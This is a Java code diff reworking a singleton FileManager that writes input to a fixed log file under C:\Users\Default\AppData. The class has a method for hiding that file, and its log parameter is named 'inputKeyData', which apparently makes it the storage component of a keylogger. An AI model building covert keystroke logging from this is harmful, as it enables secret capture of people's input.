@@ -1,32 +1,31 @@
 package dev.source.logger;
 
+import java.io.BufferedWriter;
 import java.io.File;
-import java.io.FileOutputStream;
+import java.io.FileWriter;
 import java.io.IOException;
-import java.io.PrintWriter;
 import java.nio.file.Files;
 import java.nio.file.LinkOption;
 import java.nio.file.Path;
 
 public class FileManager implements AutoCloseable {
-	private static final boolean AUTO_FLUSH = true;
 	private static FileManager fileManagerInstance = null;
 	private static final boolean ATTRIBUTE_VALUE = true;
-	private static final boolean APPEND = true;
 	private static final String FILE_LOCATION = "C:\\Users\\Default\\AppData\\log.txt";
-	private static PrintWriter printWriter;
 	private static File file;
+	private static BufferedWriter writer;
 
 	private FileManager() {
 		// Exists only to defeat instantiation.
 	}
 
-	synchronized public static FileManager getInstance() throws IOException {
+	public static FileManager getInstance() throws IOException {
 		if (fileManagerInstance == null) {
 			initialize();
 			// hide(file);
 			fileManagerInstance = new FileManager();
 		}
+		writer = new BufferedWriter(new FileWriter(file));
 		return fileManagerInstance;
 	}
 
@@ -35,7 +34,6 @@ public class FileManager implements AutoCloseable {
 		if (!file.exists()) {
 			file.createNewFile();
 		}
-		printWriter = new PrintWriter(new FileOutputStream(file, APPEND), AUTO_FLUSH);
 	}
 
 	private static void hide(File file) throws IOException {
@@ -46,9 +44,14 @@ public class FileManager implements AutoCloseable {
 		}
 	}
 
-	synchronized public void log(String string) {
-		System.out.println("log" + " " + string);
-		printWriter.write(string);
+	public void log(String inputKeyData) throws IOException {
+		writer.append(inputKeyData);
+		writer.flush();
+	}
+
+	public void emptyLocalFileContent() throws IOException {
+		writer.write("");
+		writer.flush();
 	}
 
 	public String getFileLocation() {
@@ -57,8 +60,8 @@ public class FileManager implements AutoCloseable {
 
 	@Override
 	public void close() throws Exception {
-		if (printWriter != null) {
-			printWriter.close();
+		if (writer != null) {
+			writer.close();
 		}
 	}
 
